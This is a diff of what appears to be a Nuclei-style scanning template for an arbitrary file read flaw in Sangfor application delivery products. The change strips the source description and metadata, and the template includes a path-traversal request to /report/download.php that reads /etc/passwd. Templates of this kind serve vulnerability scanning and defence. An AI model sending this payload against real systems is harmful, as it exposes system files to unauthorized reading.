@@ -3,12 +3,8 @@ info:
   name: 深信服应用交付任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mggg0q3grcwm561s'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mggg0q3grcwm561s
-    fofa: 暂无
 http:
 - raw:
   - 'GET /report/download.php?pdf=../../../../../etc/passwd HTTP/1.1
